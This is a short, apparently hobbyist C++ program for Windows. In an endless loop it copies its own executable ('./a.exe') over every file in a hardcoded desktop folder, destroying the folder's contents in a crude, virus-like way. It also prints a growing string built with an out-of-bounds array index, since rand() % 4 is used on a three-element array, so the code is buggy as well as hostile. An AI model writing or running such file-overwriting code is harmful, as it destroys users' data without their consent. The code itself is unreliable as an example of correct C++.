#include <iostream>
#include <string>
#include <array>
#include <cstdlib>
#include <unistd.h>
#include <windows.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
using namespace std;
string sWords[] = {"Lol","Mitze","Katze"};
string Chain = "";


void printer()
{
	while(true){
		std::string path = "C:/Users/sack/Desktop/adsfdasf";
	    for (const auto & entry : std::filesystem::directory_iterator(path)){
 			CopyFile("./a.exe",entry.path().string().c_str(),0);
	   		Chain = Chain + sWords[rand() % 4];
			cout << Chain;
	    }
	}
}
int main()
{

	printer();


}